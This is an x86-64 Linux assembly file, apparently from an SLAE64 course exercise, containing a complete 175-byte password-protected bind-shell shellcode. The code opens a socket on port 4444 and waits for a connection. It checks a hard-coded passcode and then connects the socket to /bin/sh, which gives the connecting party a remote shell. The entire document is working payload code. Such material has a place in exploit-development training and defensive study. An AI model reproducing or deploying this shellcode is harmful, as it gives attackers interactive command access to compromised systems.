
;Author - Andriy Brukhovetskyy - doomedraven - SLAEx64 - 1322
;175 bytes
;http://www.doomedraven.com/2014/05/slaex64-shellbindtcp-with-passcode.html

global _start
section .text
_start:
    push byte 0x29 ; 41 - socket syscall 
    pop rax
    push byte 0x02 ; AF_INET
    pop rdi 
    push byte 0x01 ; SOCK_STREAM
    pop rsi
    cdq
    syscall
    
    ;copy socket descriptor to rdi for future use
    ;bind
    xchg rdi, rax
    xor rax, rax
    mov dword [rsp-4], eax    ;INADDR_ANY
    mov word  [rsp-6], 0x5c11 ;PORT 4444
    mov byte  [rsp-8], 0x2    ;AF_INET
    sub rsp, 0x8
    
    push byte 0x31 ;49 bind
    pop rax 
    mov rsi, rsp
    cdq
    add dl, 16 ;len
    syscall
    
    ;listen
    push byte 0x32 ;listen
    pop rax
    ;push byte 0x02 ;max clients
    ;pop rsi
    syscall
     
    push byte 0x2b ; accept
    pop rax
    sub rsp, 0x10  ; adjust
    xor rsi, rsi    
    mov rsi, rsp ; pointer
    mov byte [rsp-1], 0x10 ;len
    sub rsp, 0x01   ; adjust
    cdq
    mov rdx, rsp ; pointer
    syscall
        
    ;read buffer
    mov rdi, rax ; socket
    xor rax, rax
    mov byte [rsp-1], al ;0 read
    sub rsp, 1
    cdq      
    push rdx ; 0 stdin
    lea rsi, [rsp-0x10] ; 16 bytes from buffer
    add dl, 0x10        ; len
    syscall
    
    ;test passcode
    mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
    push rdi                    ; save the socket
    lea rdi, [rsi]              ; load string from address
    scasq                       ; compare
    jz accepted_passwd          ; jump if equal
    
    ;exit if different :P
    xor rax, rax 
    add al, 60
    syscall

accepted_passwd:

    pop rdi; socket
    push byte 0x03
    pop rsi

dup2_loop:
    dec rsi
    push byte 0x21
    pop rax
    syscall
    jnz dup2_loop ; jump if not 0

    push rsi; 0
    
    ;execve
    ;push /bin//sh in reverse
    mov rbx, 0x68732f2f6e69622f
    push rbx
    
    mov rdi, rsp
    push rsi
    
    mov rdx, rsp
    push rdi 
    
    mov rsi, rsp
    push byte 0x3b
    pop rax
    syscall
    
